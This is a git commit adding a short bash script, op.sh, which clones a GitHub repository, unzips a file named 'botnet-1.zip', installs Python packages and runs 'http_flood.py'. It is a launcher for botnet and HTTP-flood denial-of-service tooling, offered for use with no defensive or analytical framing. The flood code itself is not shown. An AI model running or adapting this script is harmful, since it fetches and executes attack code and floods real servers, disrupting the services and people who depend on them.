d13b90a261c5ce0f252508f94c2a9346eaef5498
Nashit <159161842+Nashit-panel@users.noreply.github.com>
2024-08-06 14:26:55 +0600

    Create op.sh

---
+++ op.sh
@@ -0,0 +1,23 @@
+#!/bin/bash
+
+# Clone the repository
+git clone https://github.com/Nashit-panel/Moye.git
+
+# Change to the Moye directory
+cd Moye
+
+# Unzip the botnet-1.zip file
+unzip botnet-1.zip
+
+# Change to the botnet directory
+cd botnet
+
+# Install Python 3 and pip
+apt update
+apt install -y python3 python3-pip
+
+# Install the required Python packages
+pip install -r requirements.txt
+
+# Run the http_flood.py script
+python3 http_flood.py
